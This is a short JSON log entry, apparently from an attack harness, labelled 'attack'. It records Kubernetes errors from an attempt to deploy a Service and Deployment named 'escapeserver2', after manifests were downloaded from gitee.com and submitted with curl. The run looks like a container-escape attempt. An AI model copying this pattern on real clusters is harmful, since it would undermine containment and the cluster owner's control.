{
    "3051910b-574c-42e6-b2b7-088be29af944": {
        "type": "attack",
        "resp": "{\"approved\":\"false\",\"failureReason\":{\"out\":\"{\\n  \\\"kind\\\": \\\"Status\\\",\\n  \\\"apiVersion\\\": \\\"v1\\\",\\n  \\\"metadata\\\": {},\\n  \\\"status\\\": \\\"Failure\\\",\\n  \\\"message\\\": \\\"Service \\\\\\\"escapeserver2\\\\\\\" is invalid: spec.ports[0].nodePort: Invalid value: 30001: provided port is already allocated\\\",\\n  \\\"reason\\\": \\\"Invalid\\\",\\n  \\\"details\\\": {\\n    \\\"name\\\": \\\"escapeserver2\\\",\\n    \\\"kind\\\": \\\"Service\\\",\\n    \\\"causes\\\": [\\n      {\\n        \\\"reason\\\": \\\"FieldValueInvalid\\\",\\n        \\\"message\\\": \\\"Invalid value: 30001: provided port is already allocated\\\",\\n        \\\"field\\\": \\\"spec.ports[0].nodePort\\\"\\n      }\\n    ]\\n  },\\n  \\\"code\\\": 422\\n}{\\n  \\\"kind\\\": \\\"Status\\\",\\n  \\\"apiVersion\\\": \\\"v1\\\",\\n  \\\"metadata\\\": {},\\n  \\\"status\\\": \\\"Failure\\\",\\n  \\\"message\\\": \\\"deployments.apps \\\\\\\"escapeserver2\\\\\\\" already exists\\\",\\n  \\\"reason\\\": \\\"AlreadyExists\\\",\\n  \\\"details\\\": {\\n    \\\"name\\\": \\\"escapeserver2\\\",\\n    \\\"group\\\": \\\"apps\\\",\\n    \\\"kind\\\": \\\"deployments\\\"\\n  },\\n  \\\"code\\\": 409\\n}\",\"err\":\"Connecting to gitee.com (182.255.33.134:443)\\nescapeserver2_servic 100% |*******************************|   282   0:00:00 ETA\\n\\nConnecting to gitee.com (182.255.33.134:443)\\nescapeserver2_pod.ya 100% |*******************************|   699   0:00:00 ETA\\n\\n  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current\\n                                 Dload  Upload   Total   Spent    Left  Speed\\n\\r  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0\\r100   810  100   528  100   282   7135   3810 --:--:-- --:--:-- --:--:-- 10945\\n  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current\\n                                 Dload  Upload   Total   Spent    Left  Speed\\n\\r  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0\\r100   990  100   291  100   699  14550  34950 --:--:-- --:--:-- --:--:-- 49500\\n\"}}"
    }
}